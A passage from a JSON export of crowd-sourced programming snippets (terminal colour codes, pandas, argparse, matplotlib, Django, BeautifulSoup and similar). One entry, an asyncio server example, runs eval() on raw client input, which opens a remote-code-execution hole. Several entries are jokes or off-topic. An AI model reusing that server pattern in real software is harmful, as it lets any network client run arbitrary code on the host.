Purple     \\e[1;35m Yellow           \\e[1;33m White            \\e[1;37m \n# Red  print(u\"\\u001b[31mHello World\")  # Black: \\u001b[30m # Red: \\u001b[31m # Green: \\u001b[32m # Yellow: \\u001b[33m # Blue: \\u001b[34m # Magenta: \\u001b[35m # Cyan: \\u001b[36m # White: \\u001b[37m # Reset: \\u001b[0m \nenum Color {     //Color end string, color reset     RESET(\"\\033[0m\"),      // Regular Colors. Normal color, no bold, background color etc.     BLACK(\"\\033[0;30m\"),    // BLACK     RED(\"\\033[0;31m\"),      // RED     GREEN(\"\\033[0;32m\"),    // GREEN     YELLOW(\"\\033[0;33m\"),   // YELLOW     BLUE(\"\\033[0;34m\"),     // BLUE     MAGENTA(\"\\033[0;35m\"),  // MAGENTA     CYAN(\"\\033[0;36m\"),     // CYAN     WHITE(\"\\033[0;37m\"),    // WHITE      // Bold     BLACK_BOLD(\"\\033[1;30m\"),   // BLACK     RED_BOLD(\"\\033[1;31m\"),     // RED     GREEN_BOLD(\"\\033[1;32m\"),   // GREEN     YELLOW_BOLD(\"\\033[1;33m\"),  // YELLOW     BLUE_BOLD(\"\\033[1;34m\"),    // BLUE     MAGENTA_BOLD(\"\\033[1;35m\"), // MAGENTA     CYAN_BOLD(\"\\033[1;36m\"),    // CYAN     WHITE_BOLD(\"\\033[1;37m\"),   // WHITE      // Underline     BLACK_UNDERLINED(\"\\033[4;30m\"),     // BLACK     RED_UNDERLINED(\"\\033[4;31m\"),       // RED     GREEN_UNDERLINED(\"\\033[4;32m\"),     // GREEN     YELLOW_UNDERLINED(\"\\033[4;33m\"),    // YELLOW     BLUE_UNDERLINED(\"\\033[4;34m\"),      // BLUE     MAGENTA_UNDERLINED(\"\\033[4;35m\"),   // MAGENTA     CYAN_UNDERLINED(\"\\033[4;36m\"),      // CYAN     WHITE_UNDERLINED(\"\\033[4;37m\"),     // WHITE      // Background     BLACK_BACKGROUND(\"\\033[40m\"),   // BLACK     RED_BACKGROUND(\"\\033[41m\"),     // RED     GREEN_BACKGROUND(\"\\033[42m\"),   // GREEN     YELLOW_BACKGROUND(\"\\033[43m\"),  // YELLOW     BLUE_BACKGROUND(\"\\033[44m\"),    // BLUE     MAGENTA_BACKGROUND(\"\\033[45m\"), // MAGENTA     CYAN_BACKGROUND(\"\\033[46m\"),    // CYAN     WHITE_BACKGROUND(\"\\033[47m\"),   // WHITE      // High Intensity     BLACK_BRIGHT(\"\\033[0;90m\"),     // BLACK     RED_BRIGHT(\"\\033[0;91m\"),       // RED     GREEN_BRIGHT(\"\\033[0;92m\"),     // GREEN     YELLOW_BRIGHT(\"\\033[0;93m\"),    // YELLOW     BLUE_BRIGHT(\"\\033[0;94m\"),      // BLUE     MAGENTA_BRIGHT(\"\\033[0;95m\"),   // MAGENTA     CYAN_BRIGHT(\"\\033[0;96m\"),      // CYAN     WHITE_BRIGHT(\"\\033[0;97m\"),     // WHITE      // Bold High Intensity     BLACK_BOLD_BRIGHT(\"\\033[1;90m\"),    // BLACK     RED_BOLD_BRIGHT(\"\\033[1;91m\"),      // RED     GREEN_BOLD_BRIGHT(\"\\033[1;92m\"),    // GREEN     YELLOW_BOLD_BRIGHT(\"\\033[1;93m\"),   // YELLOW     BLUE_BOLD_BRIGHT(\"\\033[1;94m\"),     // BLUE     MAGENTA_BOLD_BRIGHT(\"\\033[1;95m\"),  // MAGENTA     CYAN_BOLD_BRIGHT(\"\\033[1;96m\"),     // CYAN     WHITE_BOLD_BRIGHT(\"\\033[1;97m\"),    // WHITE      // High Intensity backgrounds     BLACK_BACKGROUND_BRIGHT(\"\\033[0;100m\"),     // BLACK     RED_BACKGROUND_BRIGHT(\"\\033[0;101m\"),       // RED     GREEN_BACKGROUND_BRIGHT(\"\\033[0;102m\"),     // GREEN     YELLOW_BACKGROUND_BRIGHT(\"\\033[0;103m\"),    // YELLOW     BLUE_BACKGROUND_BRIGHT(\"\\033[0;104m\"),      // BLUE     MAGENTA_BACKGROUND_BRIGHT(\"\\033[0;105m\"),   // MAGENTA     CYAN_BACKGROUND_BRIGHT(\"\\033[0;106m\"),      // CYAN     WHITE_BACKGROUND_BRIGHT(\"\\033[0;107m\");     // WHITE      private final String code;      Color(String code) {         this.code = code;     }      @Override     public String toString() {         return code;     } }\n",
    "reg_date": "2021-10-12T11:27:59.000Z"
  },
  {
    "id": 313,
    "keyword": null,
    "link": null,
    "title": " any mobile phone built on x86 processor",
    "description": "print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:28:00.000Z"
  },
  {
    "id": 314,
    "keyword": null,
    "link": null,
    "title": " apolatrix",
    "description": "apx = ['https://apolatrix.com']  for i in apx:   print(apx)\n",
    "reg_date": "2021-10-12T11:28:00.000Z"
  },
  {
    "id": 315,
    "keyword": null,
    "link": null,
    "title": " appear message after loading bar finishes running python",
    "description": "import itertools import threading import time import sys  done = False #here is the animation def animate():     for c in itertools.cycle(['|', '/', '-', '\\\\']):         if done:             break         sys.stdout.write('\\rloading ' + c)         sys.stdout.flush()         time.sleep(0.1)     sys.stdout.write('\\rDone!     ')  t = threading.Thread(target=animate) t.start()  #long process here time.sleep(10) done = True  import time  print(\"custom message\") \n",
    "reg_date": "2021-10-12T11:28:00.000Z"
  },
  {
    "id": 316,
    "keyword": null,
    "link": null,
    "title": " append a line to a text file python",
    "description": "# Open a file with access mode 'a' file_object = open('sample.txt', 'a')   # Append 'hello' at the end of file file_object.write('hello')   # Close the file file_object.close() \n",
    "reg_date": "2021-10-12T11:28:00.000Z"
  },
  {
    "id": 317,
    "keyword": null,
    "link": null,
    "title": " append attribute ofpython",
    "description": "my_list = ['one','two','three'] my_list.append('four') #.append will add the string or int to the end of the list \n",
    "reg_date": "2021-10-12T11:28:00.000Z"
  },
  {
    "id": 318,
    "keyword": null,
    "link": null,
    "title": " append dataframe to another dataframe",
    "description": ">>> df = pd.DataFrame([[1, 2], [3, 4]], columns=list('AB'), index=['x', 'y']) >>> df    A  B x  1  2 y  3  4 >>> df2 = pd.DataFrame([[5, 6], [7, 8]], columns=list('AB'), index=['x', 'y']) >>> df.append(df2, ignore_index=True)    A  B x  1  2 y  3  4 x  5  6 y  7  8\ndf = df.append({'index1': value1, 'index2':value2,...}, ignore_index=True)\n>>> df = pd.DataFrame([[1, 2], [3, 4]], columns=list('AB')) >>> df    A  B 0  1  2 1  3  4 >>> df2 = pd.DataFrame([[5, 6], [7, 8]], columns=list('AB')) >>> df.append(df2)    A  B 0  1  2 1  3  4 0  5  6 1  7  8\n# all_res is list of DataFrames : [ dataframe, dataframe, ... ] df_res = pd.concat(all_res)\n",
    "reg_date": "2021-10-12T11:28:00.000Z"
  },
  {
    "id": 319,
    "keyword": null,
    "link": null,
    "title": " append element to an array python",
    "description": "x = ['Red', 'Blue'] x.append('Yellow')\n",
    "reg_date": "2021-10-12T11:28:00.000Z"
  },
  {
    "id": 320,
    "keyword": null,
    "link": null,
    "title": " append method linked list python",
    "description": "def append(self,item):     current = self.head     if current:         while current.getNext() != None:             current = current.getNext()         current.setNext(Node(item))     else:         self.head = Node(item)\n",
    "reg_date": "2021-10-12T11:28:00.000Z"
  },
  {
    "id": 321,
    "keyword": null,
    "link": null,
    "title": " append to front of list python",
    "description": "var = 7 array = [1,2,3,4,5,6] array.insert(0,var) print(array) # [7, 1, 2, 3, 4, 5, 6]\narray.insert(0,var)\n# list.insert(before, value) list = [\"a\", \"b\"] list.insert(0, \"c\") print(list)     # ['c', 'a', 'b']\n>>>var=7 >>>array = [1,2,3,4,5,6] >>>array.insert(0,var) >>>array [7, 1, 2, 3, 4, 5, 6]\n['bee', 'moth'] ['bee', 'moth', 'ant', 'fly']\n['bee', 'moth'] ['ant', 'bee', 'moth'] ['ant', 'bee', 'fly', 'moth']\n",
    "reg_date": "2021-10-12T11:28:00.000Z"
  },
  {
    "id": 322,
    "keyword": null,
    "link": null,
    "title": " append to pythonpath",
    "description": "export PYTHONPATH=\"${PYTHONPATH}:/my/other/path\" \nexport PYTHONPATH=\"${PYTHONPATH}:/my/other/path\"\n",
    "reg_date": "2021-10-12T11:28:01.000Z"
  },
  {
    "id": 323,
    "keyword": null,
    "link": null,
    "title": " apple",
    "description": "The greatest company ever\nLOVE IT!!\nHey Siri, How much does an iPhone cost? Siri: $1299 Hey Siri, how much money can I get from selling my kidney? Siri: $1299\nMore than a Computer, A digital food !!!\nI like pears more, change my mind\nApple is Linux in worse.\nit is cinda weird that no one has anything to say about this company.\n+----------------------+ |privacy, price, Apple.| +----------------------+\nApple is a technology company that make amazing products.\nbest_fruit = 'Apple' straight_facts = True\n",
    "reg_date": "2021-10-12T11:28:01.000Z"
  },
  {
    "id": 324,
    "keyword": null,
    "link": null,
    "title": " apply format to pandas datetime column",
    "description": "formatted_df = df[\"Date\"].dt.strftime(\"%m/%d/%y\")\n",
    "reg_date": "2021-10-12T11:28:01.000Z"
  },
  {
    "id": 325,
    "keyword": null,
    "link": null,
    "title": " area of a circle python",
    "description": "radius = float(input(\"Enter radius:\")) pi = 3.14 Area = pi * radius * radius print(\"Area = \" + str(Area)) \nimport math  radius = 3 area = math.pi * radius * radius # another way would be to set variable and round - rounded_area = round(area, 3) print(f'The area of the circle is {area:.3f}') # round answer to 3 decimal places \n#Area Of A Circle in python R = int(input(\"Enter the radius of the circle: \")) PI = 22/7 #This is a constant A = PI * R * R print(A)\n",
    "reg_date": "2021-10-12T11:28:01.000Z"
  },
  {
    "id": 326,
    "keyword": null,
    "link": null,
    "title": " argparse",
    "description": "import argparse  parser = argparse.ArgumentParser() parser.add_argument(\"-n\", \"--name\", help=\"Name of thing\") parser.add_argument(\"-s\", \"--size\", help=\"Size of thing\", type=int) args = parser.parse_args()  print(args.name, args.size)\nimport argparse  # construct the argument parse and parse the arguments ap = argparse.ArgumentParser() ap.add_argument(\"-n\", \"--name\", required=True, help=\"name of the user\") args = vars(ap.parse_args())  # display a friendly message to the user print(\"Hi there {}, it's nice to meet you!\".format(args[\"name\"]))\nimport argparse  if __name__ == \"__main__\": \t#add a description \tparser = argparse.ArgumentParser(description=\"what the program does\")  \t#add the arguments \tparser.add_argument(\"arg1\", help=\"advice on arg\") \tparser.add_argument(\"arg2\", help=\"advice on arg\") #\t\t\t\t\t\t. # \t\t\t\t\t\t. #   \t\t\t\t\t. \tparser.add_argument(\"argn\", help=\"advice on arg\")  \t#this allows you to access the arguments via the object args \targs = parser.parse_args()  \t#how to use the arguments \targs.arg1, args.arg2 ... args.argn\nimport argparse  parser = argparse.ArgumentParser() parser.add_argument('file', type=argparse.FileType('r')) args = parser.parse_args()  print(args.file.readlines())\n# Generic parser function intialization in PYTHON def create_parser(arguments):     \"\"\"Returns an instance of argparse.ArgumentParser\"\"\"     # your code here          parser = argparse.ArgumentParser(         description=\"Description of your code\")     parser.add_argument(\"argument\", help=\"mandatory or positional argument\")     parser.add_argument(\"-o\", \"--optional\",      \thelp=\"Will take an optional argument after the flag\")     namespace = parser.parse_args(arguments)          # Returns a namespace object with your arguments     return namespace \n... parser.add_argument('--val',                     choices=['a', 'b', 'c'],                     help='Special testing value')  args = parser.parse_args(sys.argv[1:])\n",
    "reg_date": "2021-10-12T11:28:01.000Z"
  },
  {
    "id": 327,
    "keyword": null,
    "link": null,
    "title": " array comparison in percent",
    "description": "import difflib pr=difflib.SequenceMatcher(None,array1,array2) print(pr.ratio())\n",
    "reg_date": "2021-10-12T11:28:01.000Z"
  },
  {
    "id": 328,
    "keyword": null,
    "link": null,
    "title": " array of 1 to 100 python",
    "description": "myList = list(range(1, 101))\n",
    "reg_date": "2021-10-12T11:28:01.000Z"
  },
  {
    "id": 329,
    "keyword": null,
    "link": null,
    "title": " array to two variables python",
    "description": ">>> a,b,c,d = [1,2,3,4] >>> a 1 >>> b 2 >>> c 3 >>> d 4\n",
    "reg_date": "2021-10-12T11:28:02.000Z"
  },
  {
    "id": 330,
    "keyword": null,
    "link": null,
    "title": " arrondire au centième python",
    "description": "#Arrondir un nombre r&eacute;el >>> round(3.1415) 3  #Arrondir un nombre r&eacute;el en gardant 1 d&eacute;cimale >>> x = 1.4567 >>> round(x,1) 1.5  #Convertir un nombre r&eacute;el en entier >>> x = 3.1415 >>> x = int(x) >>> x 3 >>> type(x) <class 'int'>  #Note: donne la m&ecirc;me chose que la fonction round() >>> x = round(3.1415) >>> type(x) <class 'int'> >>> x 3  #Arrondir une matrice de nombres r&eacute;els >>> import numpy as np >>> a = np.array(([1.24,3.46,5.34])) >>> a array([1.24, 3.46, 5.34]) >>> np.around(a, decimals=1) array([1.2, 3.5, 5.3])  #Pour convertir une matrice de nombres r&eacute;els en nombre entier il y a la fonction astype: >>> import numpy as np >>> a = np.array(([1,24,3.46,5.34])) >>> a array([ 1.  , 24.  ,  3.46,  5.34]) >>> a.astype(int) array([ 1, 24,  3,  5])  #Arrondir un nombre complexe >>> z = 2.14 + 3.47j >>> round(z.real, 1) + round(z.imag, 1) * 1j (2.1+3.5j)  #Utiliser format pour incorporer un nombre dans une cha&icirc;ne de caract&egrave;res >>> s = 'Pi value is {:06.2f}'.format(3.141592653589793) >>> s 'Pi value is 003.14' >>> s = 'Pi value is {:01.2f}'.format(3.141592653589793) >>> s 'Pi value is 3.14' \n",
    "reg_date": "2021-10-12T11:28:02.000Z"
  },
  {
    "id": 331,
    "keyword": null,
    "link": null,
    "title": " askopenfilename",
    "description": "filename2 =  filedialog.askopenfilename(title = \"Select file\",filetypes = ((\"Excel files\", \".xlsx .xls\"),))\n",
    "reg_date": "2021-10-12T11:28:02.000Z"
  },
  {
    "id": 332,
    "keyword": null,
    "link": null,
    "title": " assert len(lex) < self.bucket specs[-1][1]",
    "description": "Your max_prediction_length is 8,  so if you have labels over 8 characters,  you'll get this error.  You should adjust it with the --max-prediction CLI parameter.\n",
    "reg_date": "2021-10-12T11:28:02.000Z"
  },
  {
    "id": 333,
    "keyword": null,
    "link": null,
    "title": " assigning values in python",
    "description": "Operator:  Example:  Equivalent:   =         a = b     a = b   +=        a += b    a = (a + b)   -=        a -= b    a = (a - b)   *=        a *= b    a = (a * b)   /=        a /= b    a = (a / b)   %=        a %= b    a = (a % b)   //=       a //= b   a = (a // b)   **=       a **= b   a = (a ** b)\n",
    "reg_date": "2021-10-12T11:28:02.000Z"
  },
  {
    "id": 334,
    "keyword": null,
    "link": null,
    "title": " assistant in python",
    "description": "# J.A.R.V.I.S in pyton (;  import speech_recognition as sr  import pyttsx3 import datetime    engine = pyttsx3.init('sapi5') voices = engine.getProperty('voices') # print(voices[1].id)  Searchig for voices engine.setProperty('voice', voices[1].id) # Zira(girl)   def speak(audio):     engine.say(audio)     engine.runAndWait()  def wishMe():     hour = int(datetime.datetime.now().hour)     if hour>=0 and hour<12:         speak(\"Good Morning!\")          elif hour>=12 and hour<18:         speak(\"Good Afternoon!\")      else:         speak(\"Good Evening!\")      speak(\"I am JARVIS, Sir, How can I help you?\")   def takeCommand():      r = sr.Recognizer()     with sr.Microphone() as source:         print(\"Listening...\")         r.pause_threshold = 1         audio = r.listen(source)      try:         print(\"Recognizing...\")             query = r.recognize_google(audio, language='en-in')         print(f\"User said: {query}\\n\")      except Exception as e:         # print(e)             print(\"Say that again please...\")         return \"None\"     return query  if __name__ == '__main__':     wishMe()     takeCommand()\n",
    "reg_date": "2021-10-12T11:28:02.000Z"
  },
  {
    "id": 335,
    "keyword": null,
    "link": null,
    "title": " asyncio server python",
    "description": "import asyncio, socket  async def handle_client(reader, writer):     request = None     while request != 'quit':         request = (await reader.read(255)).decode('utf8')         response = str(eval(request)) + '\\n'         writer.write(response.encode('utf8'))         await writer.drain()     writer.close()  async def run_server():     server = await asyncio.start_server(handle_client, 'localhost', 15555)     async with server:         await server.serve_forever()  asyncio.run(run_server())\n",
    "reg_date": "2021-10-12T11:28:02.000Z"
  },
  {
    "id": 336,
    "keyword": null,
    "link": null,
    "title": " auto-py-to-exe with python3",
    "description": "pip install pyinstaller  cd FullPathOfFile in cmd console pyinstaller --onefile pythonScriptName.py # a .exe file is created in the FullPathOfFile\\dist\n$ pip install auto-py-to-exe \n",
    "reg_date": "2021-10-12T11:28:02.000Z"
  },
  {
    "id": 337,
    "keyword": null,
    "link": null,
    "title": " auto clicker in python",
    "description": "#you need to install pyautogui like this: #py.exe -m pip install pyautogui #then... import pyautogui,time while True:     pyautogui.click(100,100)     time.sleep(0.5)\nimport pyautogui import time  def click():      time.sleep(0.5)          pyautogui.click()  def main():     for i in range(10):#you can set how much times you have to click in range(no. of times to click)          click()  main()\nimport threading from pynput.mouse import Button, Controller from pynput.keyboard import Listener, KeyCode   delay = 0.001 button = Button.left start_stop_key = KeyCode(char='s') exit_key = KeyCode(char='e')   class ClickMouse(threading.Thread):     def __init__(self, delay, button):         super(ClickMouse, self).__init__()         self.delay = delay         self.button = button         self.running = False         self.program_running = True      def start_clicking(self):         self.running = True      def stop_clicking(self):         self.running = False      def exit(self):         self.stop_clicking()         self.program_running = False      def run(self):         while self.program_running:             while self.running:                 mouse.click(self.button)                 time.sleep(self.delay)             time.sleep(0.1)   mouse = Controller() click_thread = ClickMouse(delay, button) click_thread.start()   def on_press(key):     if key == start_stop_key:         if click_thread.running:             click_thread.stop_clicking()         else:             click_thread.start_clicking()     elif key == exit_key:         click_thread.exit()         listener.stop()   with Listener(on_press=on_press) as listener:     listener.join()\n",
    "reg_date": "2021-10-12T11:28:02.000Z"
  },
  {
    "id": 338,
    "keyword": null,
    "link": null,
    "title": " auto datetime in django models",
    "description": "class MyModel(models.Model):     created_at = models.DateTimeField(auto_now_add=True)     updated_at = models.DateTimeField(auto_now=True) \n",
    "reg_date": "2021-10-12T11:28:03.000Z"
  },
  {
    "id": 339,
    "keyword": null,
    "link": null,
    "title": " auto py to exe\\",
    "description": "$ pip install auto-py-to-exe \n",
    "reg_date": "2021-10-12T11:28:03.000Z"
  },
  {
    "id": 340,
    "keyword": null,
    "link": null,
    "title": " autoslugfield django 3",
    "description": "# models.py  from django.db import models  from django_extensions.db.fields import AutoSlugField  class MyModel(models.Model):     title = models.CharField(max_length=42)     slug = AutoSlugField(populate_from=['title', 'description', 'get_author_name'])  \n",
    "reg_date": "2021-10-12T11:28:03.000Z"
  },
  {
    "id": 341,
    "keyword": null,
    "link": null,
    "title": " average value of list elements in python",
    "description": "# Example to find average of list number_list = [45, 34, 10, 36, 12, 6, 80] avg = sum(number_list)/len(number_list) print(\"The average is \", round(avg,2)) \n",
    "reg_date": "2021-10-12T11:28:03.000Z"
  },
  {
    "id": 342,
    "keyword": null,
    "link": null,
    "title": " ax tick params",
    "description": "ax.tick_params(axis='both', which='major', labelsize=10)\n",
    "reg_date": "2021-10-12T11:28:03.000Z"
  },
  {
    "id": 343,
    "keyword": null,
    "link": null,
    "title": " axis font size matplotlib",
    "description": "from matplotlib import pyplot as plt      fig = plt.figure() plt.plot(data) fig.suptitle('test title', fontsize=20) plt.xlabel('xlabel', fontsize=18) plt.ylabel('ylabel', fontsize=16) fig.savefig('test.jpg')\nimport matplotlib.pyplot as plt  SMALL_SIZE = 8 MEDIUM_SIZE = 10 BIGGER_SIZE = 12  plt.rc('font', size=SMALL_SIZE)          # controls default text sizes plt.rc('axes', titlesize=SMALL_SIZE)     # fontsize of the axes title plt.rc('axes', labelsize=MEDIUM_SIZE)    # fontsize of the x and y labels plt.rc('xtick', labelsize=SMALL_SIZE)    # fontsize of the tick labels plt.rc('ytick', labelsize=SMALL_SIZE)    # fontsize of the tick labels plt.rc('legend', fontsize=SMALL_SIZE)    # legend fontsize plt.rc('figure', titlesize=BIGGER_SIZE)  # fontsize of the figure title \n",
    "reg_date": "2021-10-12T11:28:03.000Z"
  },
  {
    "id": 344,
    "keyword": null,
    "link": null,
    "title": " axis number size matplotlib",
    "description": "ax.tick_params(axis=\"x\", labelsize=8) ax.tick_params(axis=\"y\", labelsize=20)\n",
    "reg_date": "2021-10-12T11:28:03.000Z"
  },
  {
    "id": 345,
    "keyword": null,
    "link": null,
    "title": " b12 vegetables only",
    "description": "for n in range(2,7000):     if not is_prime(n):         carmichael = True         for a in range(1,n):             if Mod(a,n)^n != Mod(a,n):                 carmichael = False                 break         if carmichael:             print n \n",
    "reg_date": "2021-10-12T11:28:03.000Z"
  },
  {
    "id": 346,
    "keyword": null,
    "link": null,
    "title": " backup django db from one database to another",
    "description": "./manage.py dumpdata --exclude auth.permission --exclude contenttypes > db.json\n",
    "reg_date": "2021-10-12T11:28:03.000Z"
  },
  {
    "id": 347,
    "keyword": null,
    "link": null,
    "title": " bail bond cowboys",
    "description": "oh le cowboy\n",
    "reg_date": "2021-10-12T11:28:04.000Z"
  },
  {
    "id": 348,
    "keyword": null,
    "link": null,
    "title": " bar chart race python",
    "description": "import bar_chart_race as bcr df = bcr.load_dataset('covid19_tutorial') bcr.bar_chart_race(     df=df,     filename='covid19_horiz.mp4',     orientation='h',     sort='desc',     n_bars=6,     fixed_order=False,     fixed_max=True,     steps_per_period=10,     interpolate_period=False,     label_bars=True,     bar_size=.95,     period_label={'x': .99, 'y': .25, 'ha': 'right', 'va': 'center'},     period_fmt='%B %d, %Y',     period_summary_func=lambda v, r: {'x': .99, 'y': .18,                                       's': f'Total deaths: {v.nlargest(6).sum():,.0f}',                                       'ha': 'right', 'size': 8, 'family': 'Courier New'},     perpendicular_bar_func='median',     period_length=500,     figsize=(5, 3),     dpi=144,     cmap='dark12',     title='COVID-19 Deaths by Country',     title_size='',     bar_label_size=7,     tick_label_size=7,     shared_fontdict={'family' : 'Helvetica', 'color' : '.1'},     scale='linear',     writer=None,     fig=None,     bar_kwargs={'alpha': .7},     filter_column_colors=False)   \n",
    "reg_date": "2021-10-12T11:28:04.000Z"
  },
  {
    "id": 349,
    "keyword": null,
    "link": null,
    "title": " base64 decode python",
    "description": "import base64  message = \"Python is fun\" message_bytes = message.encode('ascii') base64_bytes = base64.b64encode(message_bytes) base64_message = base64_bytes.decode('ascii')  print(base64_message)\nimport base64 msg = base64.b64decode(msg)\n>>> import base64 >>> encoded = base64.b64encode(b'data to be encoded') >>> encoded b'ZGF0YSB0byBiZSBlbmNvZGVk' >>> data = base64.b64decode(encoded) >>> data b'data to be encoded' \n#== Decoding ==#  import base64  base64_message = 'UHl0aG9uIGlzIGZ1bg==' base64_bytes = base64_message.encode('ascii') message_bytes = base64.b64decode(base64_bytes) message = message_bytes.decode('ascii')  print(message)\nimport base64 coded_string = '''Q5YACgA...''' base64.b64decode(coded_string)\n",
    "reg_date": "2021-10-12T11:28:04.000Z"
  },
  {
    "id": 350,
    "keyword": null,
    "link": null,
    "title": " base64 encode python",
    "description": "import base64  message = \"Python is fun\" message_bytes = message.encode('ascii') base64_bytes = base64.b64encode(message_bytes) base64_message = base64_bytes.decode('ascii')  print(base64_message)\nimport base64 msg = base64.b64decode(msg)\n>>> import base64 >>> encoded = base64.b64encode(b'data to be encoded') >>> encoded b'ZGF0YSB0byBiZSBlbmNvZGVk' >>> data = base64.b64decode(encoded) >>> data b'data to be encoded' \n#== Decoding ==#  import base64  base64_message = 'UHl0aG9uIGlzIGZ1bg==' base64_bytes = base64_message.encode('ascii') message_bytes = base64.b64decode(base64_bytes) message = message_bytes.decode('ascii')  print(message)\nimport base64 coded_string = '''Q5YACgA...''' base64.b64decode(coded_string)\n",
    "reg_date": "2021-10-12T11:28:04.000Z"
  },
  {
    "id": 351,
    "keyword": null,
    "link": null,
    "title": " base template",
    "description": "<!doctype html> <html lang=\"en\"> <head>     <!-- Required meta tags -->     <meta charset=\"utf-8\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">      <!-- Bootstrap CSS -->     <link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\" integrity=\"sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z\" crossorigin=\"anonymous\">      {% block title %}     {% endblock %} </head> <body>  <!-- Navbar --> <nav class=\"navbar navbar-expand-lg navbar-light bg-light px-4\">     <a class=\"navbar-brand\" href=\"#\">Homepage</a>     <button class=\"navbar-toggler\" type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarNav\" aria-controls=\"navbarNav\" aria-expanded=\"false\" aria-label=\"Toggle navigation\">         <span class=\"navbar-toggler-icon\"></span>     </button>     <div class=\"collapse navbar-collapse\" id=\"navbarNav\">         <ul class=\"navbar-nav ml-auto\">             {% if user.is_authenticated %}                 <li class=\"nav-item\">                     <a class=\"nav-link\" href=\"#\">Profile</a>                 </li>                 <li class=\"nav-item\">                     <a class=\"nav-link\" href=\"#\">Logout</a>                 </li>             {% else %}                 <li class=\"nav-item\">                     <a class=\"nav-link\" href=\"#\">Login</a>                 </li>                 <li class=\"nav-item\">                     <a class=\"nav-link\" href=\"#\">Sign Up</a>                 </li>             {% endif %}         </ul>     </div> </nav>  {% block body %} {% endblock %}  <!-- Optional JavaScript --> <!-- jQuery first, then Popper.js, then Bootstrap JS --> <script src=\"https://code.jquery.com/jquery-3.5.1.slim.min.js\" integrity=\"sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj\" crossorigin=\"anonymous\"></script> <script src=\"https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js\" integrity=\"sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN\" crossorigin=\"anonymous\"></script> <script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js\" integrity=\"sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV\" crossorigin=\"anonymous\"></script>  </body> </html>\n",
    "reg_date": "2021-10-12T11:28:04.000Z"
  },
  {
    "id": 352,
    "keyword": null,
    "link": null,
    "title": " battery protection python programming",
    "description": "import psutil import time import pyttsx3 import os while True:     time.sleep(5)     battery = psutil.sensors_battery()     print(\"Battery percentage : \", battery.percent)     print(\"Power plugged in : \", battery.power_plugged)     print()     if battery.percent < 25 and battery.power_plugged == False:         print(\"Your battey is low on power\")         pyttsx3.speak(\"Your battery is low on power\")         if battery.percent <= 20 and battery.power_plugged == False:             pyttsx3.speak(\"power in fast\")             time.sleep(5)             pyttsx3.speak(\"Turning my prosegers on\")             time.sleep(10)             if battery.power_plugged == False:  os.system(\"shutdown /s /t 1\")     elif battery.percent > 95 and battery.power_plugged == True:         pyttsx3.speak(\"Your laptop has charged enough\")         print(\"Your laptop has charged enough\")\n",
    "reg_date": "2021-10-12T11:28:04.000Z"
  },
  {
    "id": 353,
    "keyword": null,
    "link": null,
    "title": " beautifulsoup find by class",
    "description": "soup.find_all(\"a\", class_=\"sister\")\nmydivs = soup.findAll(\"div\", {\"class\": \"stylelistrow\"})\n",
    "reg_date": "2021-10-12T11:28:04.000Z"
  },
  {
    "id": 354,
    "keyword": null,
    "link": null,
    "title": " beautifulsoup open html file",
    "description": "#!/usr/bin/python  from bs4 import BeautifulSoup  with open('index.html', 'r') as f:      contents = f.read()      soup = BeautifulSoup(contents, 'lxml')      print(soup.h2)     print(soup.head)     print(soup.li) \n",
    "reg_date": "2021-10-12T11:28:04.000Z"
  },
  {
    "id": 355,
    "keyword": null,
    "link": null,
    "title": " bee movie script",
    "description": "#So I actually got the whole script pasted in here but even after having  #my pc run for hours it didnt save so here&acute;s python code to give you the #script. Have... fun? I dont really know what to call it  import requests  script = requests.get(\"https://gist.githubusercontent.com/The5heepDev/a15539b297a7862af4f12ce07fee6bb7/raw/7164813a9b8d0a3b2dcffd5b80005f1967887475/entire_bee_movie_script\").text print(\"Enjoy the pain!\\n-Ole\\n\") print(script)\nim not going to do this\n\n",
    "reg_date": "2021-10-12T11:28:04.000Z"
  },
  {
    "id": 356,
    "keyword": null,
    "link": null,
    "title": " best free rat for windows",
    "description": "while True: \tprint('DON\\'T')\n",
    "reg_date": "2021-10-12T11:28:05.000Z"
  },
  {
    "id": 357,
    "keyword": null,
    "link": null,
    "title": " best games made in pygame",
    "description": "this one is pretty good https://dafluffypotato.itch.io/drawn-down-abyss\n",
    "reg_date": "2021-10-12T11:28:05.000Z"
  },
  {
    "id": 358,
    "keyword": null,
    "link": null,
    "title": " beuatiful soup find a href",
    "description": "from BeautifulSoup import BeautifulSoup  html = '''<a href=\"some_url\">next</a> <span class=\"class\"><a href=\"another_url\">later</a></span>'''  soup = BeautifulSoup(html)  for a in soup.find_all('a', href=True):     print \"Found the URL:\", a['href']\n",
    "reg_date": "2021-10-12T11:28:05.000Z"
  },
  {
    "id": 359,
    "keyword": null,
    "link": null,
    "title": " bezier curve python",
    "description": "def bezier_curve(def_points, speed=0.01): # WARNING: May run into floating-point issues     n = len(def_points)     points = []     for t in [_ * speed for _ in range(int((1 + speed * 2) // speed))]:         points.append([sum(math.comb(n - 1, i) * ((1 - t) ** (n - 1 - i)) * (t ** i) * def_points[i][0] for i in range(n)), sum(math.comb(n - 1, i) * ((1 - t) ** (n - 1 - i)) * (t ** i) * def_points[i][1] for i in range(n))])     return points\n",
    "reg_date": "2021-10-12T11:28:05.000Z"
  },
  {
    "id": 360,
    "keyword": null,
    "link": null,
    "title": " bg white tkinter",
    "description": "root.configure(background='black')\n",
    "reg_date": "2021-10-12T11:28:05.000Z"
  },
  {
    "id": 361,
    "keyword": null,
    "link": null,
    "title": " bgr2gray opencv",
    "description": "img = cv2.imread(path) img_gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n",
    "reg_date": "2021-10-12T11:28:05.000Z"
  },
  {
    "id": 362,
    "keyword": null,
    "link": null,
    "title": " bgr to gray opencv",
